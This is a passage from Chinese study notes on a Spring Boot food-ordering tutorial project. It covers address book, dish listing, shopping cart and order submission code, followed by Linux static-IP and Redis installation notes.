class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置默认地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PutMapping(&quot;default&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;AddressBook&gt; <span class="title function_">setDefault</span><span class="params">(<span class="meta">@RequestBody</span> AddressBook addressBook)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;addressBook:&#123;&#125;&quot;</span>, addressBook);</span><br><span class="line">        LambdaUpdateWrapper&lt;AddressBook&gt; wrapper = <span class="keyword">new</span> <span class="title class_">LambdaUpdateWrapper</span>&lt;&gt;();</span><br><span class="line">        wrapper.eq(AddressBook::getUserId, BaseContext.getCurrentId());</span><br><span class="line">        wrapper.set(AddressBook::getIsDefault, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//SQL:update address_book set is_default = 0 where user_id = ?</span></span><br><span class="line">        addressBookService.update(wrapper);</span><br><span class="line"></span><br><span class="line">        addressBook.setIsDefault(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//SQL:update address_book set is_default = 1 where id = ?</span></span><br><span class="line">        addressBookService.updateById(addressBook);</span><br><span class="line">        <span class="keyword">return</span> R.success(addressBook);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">get</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="type">AddressBook</span> <span class="variable">addressBook</span> <span class="operator">=</span> addressBookService.getById(id);</span><br><span class="line">        <span class="keyword">if</span> (addressBook != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.success(addressBook);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> R.error(<span class="string">&quot;没有找到该对象&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询默认地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;default&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;AddressBook&gt; <span class="title function_">getDefault</span><span class="params">()</span> &#123;</span><br><span class="line">        LambdaQueryWrapper&lt;AddressBook&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(AddressBook::getUserId, BaseContext.getCurrentId());</span><br><span class="line">        queryWrapper.eq(AddressBook::getIsDefault, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//SQL:select * from address_book where user_id = ? and is_default = 1</span></span><br><span class="line">        <span class="type">AddressBook</span> <span class="variable">addressBook</span> <span class="operator">=</span> addressBookService.getOne(queryWrapper);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == addressBook) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.error(<span class="string">&quot;没有找到该对象&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> R.success(addressBook);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询指定用户的全部地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;List&lt;AddressBook&gt;&gt; <span class="title function_">list</span><span class="params">(AddressBook addressBook)</span> &#123;</span><br><span class="line">        addressBook.setUserId(BaseContext.getCurrentId());</span><br><span class="line">        log.info(<span class="string">&quot;addressBook:&#123;&#125;&quot;</span>, addressBook);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//条件构造器</span></span><br><span class="line">        LambdaQueryWrapper&lt;AddressBook&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="literal">null</span> != addressBook.getUserId(), AddressBook::getUserId, addressBook.getUserId());</span><br><span class="line">        queryWrapper.orderByDesc(AddressBook::getUpdateTime);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//SQL:select * from address_book where user_id = ? order by update_time desc</span></span><br><span class="line">        <span class="keyword">return</span> R.success(addressBookService.list(queryWrapper));</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@PutMapping</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> AddressBook addressBook)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            addressBookService.updateById(addressBook);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> R.error(<span class="string">&quot;更新失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;更新成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="菜品展示"><a href="#菜品展示" class="headerlink" title="菜品展示"></a>菜品展示</h3><p>需求分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户登录成功后跳转到系统首页，在首页需要根据分类来展示菜品和套餐。如果菜品设置了口味信息，需要展示选择规格按钮，否则显示+ 按钮。</span><br></pre></td></tr></table></figure>

<p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、页面(front/index.html)发送ajax请求，获取分类数据(菜品分类和套餐分类)</span><br><span class="line">2、页面发送ajax请求，获取第一个分类下的菜品或者套餐</span><br></pre></td></tr></table></figure>

<p>未完成购物车功能，先修改前端代码</p>
<p>修改DishController代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;List&lt;DishDto&gt;&gt; <span class="title function_">list</span><span class="params">(Dish dish)</span>&#123;</span><br><span class="line">    <span class="comment">//构造查询条件</span></span><br><span class="line">    LambdaQueryWrapper&lt;Dish&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(dish.getCategoryId() != <span class="literal">null</span> ,Dish::getCategoryId,dish.getCategoryId());</span><br><span class="line">    <span class="comment">//添加条件，查询状态为1（起售状态）的菜品</span></span><br><span class="line">    queryWrapper.eq(Dish::getStatus,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加排序条件</span></span><br><span class="line">    queryWrapper.orderByAsc(Dish::getSort).orderByDesc(Dish::getUpdateTime);</span><br><span class="line"></span><br><span class="line">    List&lt;Dish&gt; list = dishService.list(queryWrapper);</span><br><span class="line"></span><br><span class="line">    List&lt;DishDto&gt; dishDtoList = list.stream().map((item) -&gt; &#123;</span><br><span class="line">        <span class="type">DishDto</span> <span class="variable">dishDto</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DishDto</span>();</span><br><span class="line"></span><br><span class="line">        BeanUtils.copyProperties(item,dishDto);</span><br><span class="line"></span><br><span class="line">        <span class="type">Long</span> <span class="variable">categoryId</span> <span class="operator">=</span> item.getCategoryId();<span class="comment">//分类id</span></span><br><span class="line">        <span class="comment">//根据id查询分类对象</span></span><br><span class="line">        <span class="type">Category</span> <span class="variable">category</span> <span class="operator">=</span> categoryService.getById(categoryId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(category != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">categoryName</span> <span class="operator">=</span> category.getName();</span><br><span class="line">            dishDto.setCategoryName(categoryName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当前菜品的id</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">dishId</span> <span class="operator">=</span> item.getId();</span><br><span class="line">        LambdaQueryWrapper&lt;DishFlavor&gt; lambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        lambdaQueryWrapper.eq(DishFlavor::getDishId,dishId);</span><br><span class="line">        <span class="comment">//SQL:select * from dish_flavor where dish_id = ?</span></span><br><span class="line">        List&lt;DishFlavor&gt; dishFlavorList = dishFlavorService.list(lambdaQueryWrapper);</span><br><span class="line">        dishDto.setFlavors(dishFlavorList);</span><br><span class="line">        <span class="keyword">return</span> dishDto;</span><br><span class="line">    &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> R.success(dishDtoList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改setmealController</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/list&quot;)</span><br><span class="line">public R&lt;List&lt;Setmeal&gt;&gt; list(Setmeal setmeal)&#123;</span><br><span class="line">    LambdaQueryWrapper&lt;Setmeal&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(setmeal.getCategoryId() != null,Setmeal::getCategoryId,setmeal.getCategoryId());</span><br><span class="line">    queryWrapper.eq(setmeal.getStatus() != null,Setmeal::getStatus,setmeal.getStatus());</span><br><span class="line">    queryWrapper.orderByDesc(Setmeal::getUpdateTime);</span><br><span class="line"></span><br><span class="line">    List&lt;Setmeal&gt; list = setmealService.list(queryWrapper);</span><br><span class="line"></span><br><span class="line">    return R.success(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="购物车"><a href="#购物车" class="headerlink" title="购物车"></a>购物车</h3><p>需求分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">移动端用户可以将菜品或者套餐添加到购物车。对于菜品来说，如果设置了口味信息，则需要选择规格后才能加入购物车;对于套餐来说，可以直接点击 + 将当前套餐加入购物车。在购物车中可以修改菜品和套餐的数量也可以清空购物车。</span><br></pre></td></tr></table></figure>

<p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、点击加入购物车或者 + 按钮，页面发送ajax请求，请求服务端，将菜品或者套餐添加到购物车</span><br><span class="line">2、点击加入购物车点击购物车图标，页面发送ajax请求，请求服务端查询购物车中的菜品和套餐</span><br><span class="line">3、点击清空购物车按钮，页面发送ajax请求，请求服务端来执行清空购物车操作</span><br></pre></td></tr></table></figure>

<p>准备工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体类 ShoppingCart</span><br><span class="line">Mapper接口 ShoppingCartMapper</span><br><span class="line">业务层接口 ShoppingCartService</span><br><span class="line">业务层实现类 5hoppingcartservicelmpl</span><br><span class="line">控制层 ShoppingCartController</span><br></pre></td></tr></table></figure>

<p>controller代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/shoppingCart&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShoppingCartController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ShoppingCartService shoppingCartService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加购物车</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> shoppingCart</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;ShoppingCart&gt; <span class="title function_">add</span><span class="params">(<span class="meta">@RequestBody</span> ShoppingCart shoppingCart)</span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;购物车数据:&#123;&#125;&quot;</span>,shoppingCart);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置用户id，指定当前是哪个用户的购物车数据</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">currentId</span> <span class="operator">=</span> BaseContext.getCurrentId();</span><br><span class="line">        shoppingCart.setUserId(currentId);</span><br><span class="line"></span><br><span class="line">        <span class="type">Long</span> <span class="variable">dishId</span> <span class="operator">=</span> shoppingCart.getDishId();</span><br><span class="line"></span><br><span class="line">        LambdaQueryWrapper&lt;ShoppingCart&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(ShoppingCart::getUserId,currentId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dishId != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//添加到购物车的是菜品</span></span><br><span class="line">            queryWrapper.eq(ShoppingCart::getDishId,dishId);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//添加到购物车的是套餐</span></span><br><span class="line">            queryWrapper.eq(ShoppingCart::getSetmealId,shoppingCart.getSetmealId());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查询当前菜品或者套餐是否在购物车中</span></span><br><span class="line">        <span class="comment">//SQL:select * from shopping_cart where user_id = ? and dish_id/setmeal_id = ?</span></span><br><span class="line">        <span class="type">ShoppingCart</span> <span class="variable">cartServiceOne</span> <span class="operator">=</span> shoppingCartService.getOne(queryWrapper);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(cartServiceOne != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//如果已经存在，就在原来数量基础上加一</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">number</span> <span class="operator">=</span> cartServiceOne.getNumber();</span><br><span class="line">            cartServiceOne.setNumber(number + <span class="number">1</span>);</span><br><span class="line">            shoppingCartService.updateById(cartServiceOne);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//如果不存在，则添加到购物车，数量默认就是一</span></span><br><span class="line">            shoppingCart.setNumber(<span class="number">1</span>);</span><br><span class="line">            shoppingCart.setCreateTime(LocalDateTime.now());</span><br><span class="line">            shoppingCartService.save(shoppingCart);</span><br><span class="line">            cartServiceOne = shoppingCart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.success(cartServiceOne);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查看购物车</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;List&lt;ShoppingCart&gt;&gt; <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;查看购物车...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        LambdaQueryWrapper&lt;ShoppingCart&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(ShoppingCart::getUserId,BaseContext.getCurrentId());</span><br><span class="line">        queryWrapper.orderByAsc(ShoppingCart::getCreateTime);</span><br><span class="line"></span><br><span class="line">        List&lt;ShoppingCart&gt; list = shoppingCartService.list(queryWrapper);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.success(list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 清空购物车</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/clean&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">clean</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//SQL:delete from shopping_cart where user_id = ?</span></span><br><span class="line"></span><br><span class="line">        LambdaQueryWrapper&lt;ShoppingCart&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(ShoppingCart::getUserId,BaseContext.getCurrentId());</span><br><span class="line"></span><br><span class="line">        shoppingCartService.remove(queryWrapper);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;清空购物车成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前端文件改回来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cartListApi(data) &#123;</span><br><span class="line">    return $axios(&#123;</span><br><span class="line">        &#x27;url&#x27;: &#x27;/shoppingCart/list&#x27;,</span><br><span class="line">        // &#x27;url&#x27;: &#x27;/front/cartData.json&#x27;,</span><br><span class="line">        &#x27;method&#x27;: &#x27;get&#x27;,</span><br><span class="line">        params:&#123;...data&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="用户下单"><a href="#用户下单" class="headerlink" title="用户下单"></a>用户下单</h3><p>数据模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">orders:订单表</span><br><span class="line">order detail:订单明细表</span><br></pre></td></tr></table></figure>

<p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在购物车中点击按钮，页面跳转到订单确认页面</span><br><span class="line">2、在订单确认页面，发送ajax请求，请求服务端获取当前登录用户的默认地址</span><br><span class="line">3、在订单确认页面，发送ajax请求，请求服务端获取当前登录用户的购物车数据</span><br><span class="line">4、在订单确认页面点击太支忖按钮，发送ajax请求，请求服务端完成下单操作</span><br></pre></td></tr></table></figure>

<p>准备工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体类 0rders、0rderDetail</span><br><span class="line">Mapper接口 OrderMapper、OrderDetailMapper</span><br><span class="line">业务层接口 OrderSerice、OrderDetailservice</span><br><span class="line">业务层实现类 OrderServicelmpl、OrderDetailServicelmpl</span><br><span class="line">控制层 OrderController、OrderDetailController</span><br></pre></td></tr></table></figure>

<p>orderServiceImpl代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;OrderMapper, Orders&gt; <span class="keyword">implements</span> <span class="title class_">OrderService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ShoppingCartService shoppingCartService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AddressBookService addressBookService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderDetailService orderDetailService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户下单</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orders</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">submit</span><span class="params">(Orders orders)</span> &#123;</span><br><span class="line">        <span class="comment">//获得当前用户id</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> BaseContext.getCurrentId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查询当前用户的购物车数据</span></span><br><span class="line">        LambdaQueryWrapper&lt;ShoppingCart&gt; wrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        wrapper.eq(ShoppingCart::getUserId,userId);</span><br><span class="line">        List&lt;ShoppingCart&gt; shoppingCarts = shoppingCartService.list(wrapper);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(shoppingCarts == <span class="literal">null</span> || shoppingCarts.size() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;购物车为空，不能下单&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查询用户数据</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getById(userId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查询地址数据</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">addressBookId</span> <span class="operator">=</span> orders.getAddressBookId();</span><br><span class="line">        <span class="type">AddressBook</span> <span class="variable">addressBook</span> <span class="operator">=</span> addressBookService.getById(addressBookId);</span><br><span class="line">        <span class="keyword">if</span>(addressBook == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;用户地址信息有误，不能下单&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> IdWorker.getId();<span class="comment">//订单号</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AtomicInteger</span> <span class="variable">amount</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;OrderDetail&gt; orderDetails = shoppingCarts.stream().map((item) -&gt; &#123;</span><br><span class="line">            <span class="type">OrderDetail</span> <span class="variable">orderDetail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderDetail</span>();</span><br><span class="line">            orderDetail.setOrderId(orderId);</span><br><span class="line">            orderDetail.setNumber(item.getNumber());</span><br><span class="line">            orderDetail.setDishFlavor(item.getDishFlavor());</span><br><span class="line">            orderDetail.setDishId(item.getDishId());</span><br><span class="line">            orderDetail.setSetmealId(item.getSetmealId());</span><br><span class="line">            orderDetail.setName(item.getName());</span><br><span class="line">            orderDetail.setImage(item.getImage());</span><br><span class="line">            orderDetail.setAmount(item.getAmount());</span><br><span class="line">            amount.addAndGet(item.getAmount().multiply(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(item.getNumber())).intValue());</span><br><span class="line">            <span class="keyword">return</span> orderDetail;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        orders.setId(orderId);</span><br><span class="line">        orders.setOrderTime(LocalDateTime.now());</span><br><span class="line">        orders.setCheckoutTime(LocalDateTime.now());</span><br><span class="line">        orders.setStatus(<span class="number">2</span>);</span><br><span class="line">        orders.setAmount(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(amount.get()));<span class="comment">//总金额</span></span><br><span class="line">        orders.setUserId(userId);</span><br><span class="line">        orders.setNumber(String.valueOf(orderId));</span><br><span class="line">        orders.setUserName(user.getName());</span><br><span class="line">        orders.setConsignee(addressBook.getConsignee());</span><br><span class="line">        orders.setPhone(addressBook.getPhone());</span><br><span class="line">        orders.setAddress((addressBook.getProvinceName() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : addressBook.getProvinceName())</span><br><span class="line">                + (addressBook.getCityName() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : addressBook.getCityName())</span><br><span class="line">                + (addressBook.getDistrictName() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : addressBook.getDistrictName())</span><br><span class="line">                + (addressBook.getDetail() == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : addressBook.getDetail()));</span><br><span class="line">        <span class="comment">//向订单表插入数据，一条数据</span></span><br><span class="line">        <span class="built_in">this</span>.save(orders);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向订单明细表插入数据，多条数据</span></span><br><span class="line">        orderDetailService.saveBatch(orderDetails);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//清空购物车数据</span></span><br><span class="line">        shoppingCartService.remove(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>orderController代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;/order&quot;)</span><br><span class="line">public class OrderController &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private OrderService orderService;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 用户下单</span><br><span class="line">     * @param orders</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @PostMapping(&quot;/submit&quot;)</span><br><span class="line">    public R&lt;String&gt; submit(@RequestBody Orders orders)&#123;</span><br><span class="line">        log.info(&quot;订单数据：&#123;&#125;&quot;,orders);</span><br><span class="line">        orderService.submit(orders);</span><br><span class="line">        return R.success(&quot;下单成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/w1014074794/article/details/125607205">mybatis-plus雪花算法增强:idworker-CSDN博客</a></p>
<h3 id="软件安装-安装方法"><a href="#软件安装-安装方法" class="headerlink" title="软件安装-安装方法"></a>软件安装-安装方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二进制发布包安装</span><br><span class="line">	软件已经针对具体平台编译打包发布，只要解压，修改配置即可</span><br><span class="line">rpm安装</span><br><span class="line">	软件已经按照redhat的包管理规范进行打包，使用rpm命令进行安装，不能自行解决库依赖问题</span><br><span class="line">yum安装</span><br><span class="line">	一种在线软件安装方式，本质上还是rpm安装，自动下载安装包并安装，安装过程中自动解决库依赖问题</span><br><span class="line">源码编译安装</span><br><span class="line">	软件以源码工程的形式发布，需要自己编译打包</span><br></pre></td></tr></table></figure>

<h3 id="设置静态ip方法"><a href="#设置静态ip方法" class="headerlink" title="设置静态ip方法"></a>设置静态ip方法</h3><p>修改&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33 （不一定是33具体看网卡名称）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=192.168.138.100 # 将XXX替换为您希望设置的静态IP地址</span><br><span class="line">NETMASK=255.255.255.0 # 根据您的子网掩码修改</span><br><span class="line">GATEWAY=192.168.138.2 # 将192.168.64.2替换为您的网关地址，通常是NAT模式下的VMnet8网关</span><br><span class="line">DNS1=192.168.138.2 # 您可以使用其他DNS服务器地址</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;e50f5f46-3ab2-4da0-bb39-64703834a698&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">ZONE=public</span><br></pre></td></tr></table></figure>

<p>systmctl restart network</p>
<h3 id="linuxRedis安装"><a href="#linuxRedis安装" class="headerlink" title="linuxRedis安装"></a>linuxRedis安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Linux系统安装Redis步骤:</span><br><span class="line">1.将Redis安装包上传到Linux</span><br><span class="line">2.解压安装包，命令:tar-zxvfredis-4.0.0.tar.gz-C/usr/local</span><br><span class="line">3.安装Redis的依赖环境gCc，命令:yuminstall gcc-C++</span><br><span class="line">4.进入/usr/local/redis-4.0.0，进行编译，命令:make</span><br><span class="line">5.进入redis的src目录，进行安装，命令:make install</span><br></pre></td></tr></table></figure>

<h3 id="Redis启动与停止-amp-设置密码远程连接"><a href="#Redis启动与停止-amp-设置密码远程连接" class="headerlink" title="Redis启动与停止&amp;设置密码远程连接"></a>Redis启动与停止&amp;设置密码远程连接</h3><p>·后台运行</p>
